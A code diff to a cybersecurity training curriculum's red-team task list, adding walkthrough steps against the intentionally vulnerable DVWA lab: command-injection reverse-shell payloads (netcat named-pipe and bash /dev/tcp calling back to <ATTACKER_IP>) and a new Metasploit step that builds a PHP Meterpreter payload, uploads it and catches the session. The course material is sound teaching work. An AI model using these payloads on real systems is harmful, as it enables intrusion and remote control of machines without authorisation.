@@ -360,17 +360,18 @@ const RED_TASKS: Task[] = [
     title: 'Authorized Attacks & Evidence',
     objective: 'Execute one well-documented exploit chain with complete evidence trail.',
     frameworks: ['OWASP', 'NIST_800_61', 'CVSS'],
-    deliverables: ['SQL_Injection_Proof.txt', 'Brute_Force_Proof.txt', 'Reverse_Shell_Proof.txt', 'Evidence_Photos.zip'],
+    deliverables: ['SQL_Injection_Proof.txt', 'Brute_Force_Proof.txt', 'Reverse_Shell_Proof.txt', 'Metasploit_Proof.txt', 'Evidence_Photos.zip'],
     prerequisites: ['Confirmed vulnerabilities from Week 2', 'Rules of Engagement (stay in scope)'],
     definitionOfDone: ['One full exploit chain proven with evidence', 'All *_Proof.txt + Evidence_Photos.zip saved'],
     handoff: [{ to: 'grc', artifact: 'Evidence_Photos.zip', note: 'Submit attack evidence for chain of custody.' }],
-    learn: ['Exploiting SQL injection', 'Brute-forcing authentication', 'Command injection & reverse shells', 'Capturing court-ready evidence'],
-    tools: ['sqlmap / Burp', 'hydra', 'netcat'],
+    learn: ['Exploiting SQL injection', 'Brute-forcing authentication', 'Command injection & reverse shells', 'Metasploit framework exploitation', 'Capturing court-ready evidence'],
+    tools: ['sqlmap', 'hydra', 'netcat', 'metasploit'],
     steps: [
       {
         id: 'red-w3-s1',
         title: 'SQL Injection Attack',
         description: 'Dump the DVWA users table through the SQL-injection page.',
+        instruction: 'In a browser, log into DVWA and set Security = Low (DVWA Security page), then open the SQL Injection page once so the id parameter exists. Run sqlmap from your Kali terminal against that URL.',
         commands: [
           { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Make the week-3 folder to save your proof into (safe to run again).' },
           {
@@ -401,6 +402,7 @@ const RED_TASKS: Task[] = [
         id: 'red-w3-s2',
         title: 'Brute Force Attack',
         description: 'Guess the login password with hydra against the DVWA login form.',
+        instruction: 'Run this from your Kali terminal against the DVWA login form (login.php). Unsure of the failure text? Submit a wrong password in the browser first and copy the exact "Login failed" message.',
         commands: [
           { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Make the week-3 folder to save your proof into (safe to run again).' },
           {
@@ -433,12 +435,12 @@ const RED_TASKS: Task[] = [
         id: 'red-w3-s3',
         title: 'Command Injection & Reverse Shell',
         description: 'Catch a shell from the target using a command-injection payload.',
-        instruction: 'Two machines. First start the listener on YOUR Kali, then submit a payload in the vulnerable web input (e.g. DVWA Command Injection). When the shell lands, run id and save its output plus your notes to ~/team-artifacts/week-3/Reverse_Shell_Proof.txt.',
+        instruction: 'A TWO-WINDOW attack — know exactly where each line goes:\n① KALI TERMINAL — start the listener (command 1) and leave it running.\n② BROWSER — open DVWA (Security = Low) → Command Injection. In the "Enter an IP address" box, paste ONE payload below (command 2 or its fallback 3) and click Submit. THIS is where the injected command runs — not your terminal.\n③ KALI TERMINAL — the shell lands in your listener window: run id, then save it + your notes to ~/team-artifacts/week-3/Reverse_Shell_Proof.txt.',
         commands: [
-          { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Make the week-3 folder to save your proof into (safe to run again).' },
+          { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Kali terminal: make the week-3 folder to save your proof into (safe to run again).' },
           {
             cmd: 'nc -lvnp 4444',
-            explain: 'On YOUR Kali: start a listener and wait for the target to connect back. Leave this running in its own terminal.',
+            explain: '① KALI TERMINAL: start a listener and wait for the target to connect back. Leave this running in its own terminal.',
             flags: [
               { flag: 'nc', meaning: 'Netcat — raw TCP connections.' },
               { flag: '-l', meaning: 'Listen mode (wait for a connection).' },
@@ -449,7 +451,7 @@ const RED_TASKS: Task[] = [
           },
           {
             cmd: '127.0.0.1; mkfifo /tmp/f; nc <ATTACKER_IP> 4444 < /tmp/f | /bin/bash > /tmp/f',
-            explain: 'Paste this into the vulnerable WEB input (not your terminal). The 127.0.0.1 satisfies the field, then ; runs your command: a named pipe wires /bin/bash to a connection back to your Kali listener.',
+            explain: '② BROWSER → DVWA → Command Injection → "Enter an IP address" field (NOT your terminal): paste this and Submit. The 127.0.0.1 satisfies the field, then ; runs your command — a named pipe wires /bin/bash to a connection back to your Kali listener.',
             flags: [
               { flag: '127.0.0.1;', meaning: 'Satisfies the intended field, then ; starts your injected command.' },
               { flag: 'mkfifo /tmp/f', meaning: 'Create a named pipe used to shuttle data both ways.' },
@@ -459,7 +461,7 @@ const RED_TASKS: Task[] = [
           },
           {
             cmd: '127.0.0.1; bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1',
-            explain: 'Fallback payload if nc or mkfifo is not available: the bash built-in /dev/tcp opens the connection back to your listener. Paste into the same web input.',
+            explain: '② BROWSER (same "Enter an IP address" field) — fallback if nc or mkfifo is not available: the bash built-in /dev/tcp opens the connection back to your listener. Paste this instead and Submit.',
             flags: [
               { flag: 'bash -i', meaning: 'Start an interactive bash shell.' },
               { flag: '>& /dev/tcp/<ATTACKER_IP>/4444', meaning: 'Redirect it over a TCP connection to your Kali on port 4444.' },
@@ -475,6 +477,60 @@ const RED_TASKS: Task[] = [
         isEvidenceStep: true,
         verify: ['uid='],
         troubleshooting: 'No shell? Put YOUR Kali IP in <ATTACKER_IP> (not 127.0.0.1), keep the listener running, and make sure port 4444 is free ("Address already in use" → another listener is running; find it with jobs, stop with kill %1). If mkfifo fails, use the bash /dev/tcp fallback. Confirm the web field actually runs commands (the ; injection) and that the target can reach your Kali.',
+      },
+      {
+        id: 'red-w3-msf',
+        title: 'Metasploit Exploitation (File Upload → Meterpreter)',
+        description: 'Weaponise DVWA File Upload: upload a PHP payload and catch a Meterpreter session with Metasploit.',
+        instruction: 'A THREE-WINDOW attack — know where each line goes:\n① KALI TERMINAL — build the payload (command 2).\n② KALI (msfconsole) — start the handler (command 3) and leave it waiting.\n③ BROWSER — in DVWA (Security = Low) → File Upload, choose shell.php and Upload; note the path DVWA prints, then open that path (command 4) to run it.\nBack in msfconsole a Meterpreter session opens: run sysinfo and getuid (command 5) and save the proof.',
+        commands: [
+          { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Kali terminal: make the week-3 folder (safe to run again).' },
+          {
+            cmd: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4445 -f raw -o ~/team-artifacts/week-3/shell.php',
+            explain: '① KALI TERMINAL: generate a PHP Meterpreter payload that connects back to your Kali. Uses port 4445 so it does not clash with the netcat listener on 4444.',
+            flags: [
+              { flag: 'msfvenom', meaning: 'Metasploit’s payload generator.' },
+              { flag: '-p php/meterpreter/reverse_tcp', meaning: 'A PHP Meterpreter that dials back to you (reverse connection).' },
+              { flag: 'LHOST=<ATTACKER_IP>', meaning: 'Your Kali IP — where the shell connects back to.' },
+              { flag: 'LPORT=4445', meaning: 'The port your handler listens on.' },
+              { flag: '-f raw -o shell.php', meaning: 'Write the raw PHP payload to shell.php (the file you upload).' },
+            ],
+          },
+          {
+            cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT 4445; run"',
+            explain: '② KALI (new terminal): start the Metasploit handler that catches the session. Leave it running while you upload and trigger the shell.',
+            flags: [
+              { flag: 'msfconsole -q -x "…"', meaning: 'Launch Metasploit quietly and run these commands automatically.' },
+              { flag: 'use exploit/multi/handler', meaning: 'The generic listener that receives payload connections.' },
+              { flag: 'set PAYLOAD php/meterpreter/reverse_tcp', meaning: 'Must match the payload you built with msfvenom.' },
+              { flag: 'set LHOST / LPORT', meaning: 'Same IP and port as the payload (<ATTACKER_IP> : 4445).' },
+              { flag: 'run', meaning: 'Start waiting for the connection.' },
+            ],
+          },
+          {
+            cmd: 'curl "http://<YOUR_TARGET_IP>:8080/hackable/uploads/shell.php"',
+            explain: '③ BROWSER or Kali: after uploading shell.php on DVWA → File Upload (Security = Low), open the path DVWA printed to RUN the payload. Adjust the path if DVWA shows a different one.',
+            flags: [
+              { flag: 'http://<YOUR_TARGET_IP>:8080/…/uploads/shell.php', meaning: 'The uploaded payload’s URL — visiting it executes the PHP and fires the reverse connection.' },
+            ],
+          },
+          {
+            cmd: 'sysinfo; getuid',
+            explain: 'KALI (msfconsole, inside the Meterpreter session): confirm the host and the user you are running as, then save the session output to ~/team-artifacts/week-3/Metasploit_Proof.txt.',
+            flags: [
+              { flag: 'sysinfo', meaning: 'Show the target OS/host details.' },
+              { flag: 'getuid', meaning: 'Show which user the Meterpreter runs as (proves code execution).' },
+            ],
+          },
+        ],
+        expectedOutput: 'Meterpreter session 1 opened; sysinfo + getuid print the target host and user (www-data).',
+        outputExplanation: 'A "Meterpreter session 1 opened" line means the uploaded payload connected back; sysinfo/getuid prove you have interactive code execution on the target through Metasploit.',
+        whatItMeans: 'Shows a full exploit framework can turn an unrestricted file upload into remote control.',
+        frameworks: ['OWASP', 'NIST_800_115'],
+        producesDeliverable: 'Metasploit_Proof.txt',
+        isEvidenceStep: true,
+        verify: ['meterpreter'],
+        troubleshooting: 'No session? Confirm LHOST=<ATTACKER_IP> is your Kali IP and the handler LPORT (4445) equals the payload LPORT. Payload not executing? Make sure shell.php starts with <?php (msfvenom raw output sometimes needs it prepended). Upload rejected? Set DVWA Security to Low so .php is allowed. 404 on the shell URL? Use the exact path DVWA printed (often ../../hackable/uploads/). Session dies instantly? Re-run the handler, then re-open the URL.',
       },
       {
         id: 'red-w3-s4',
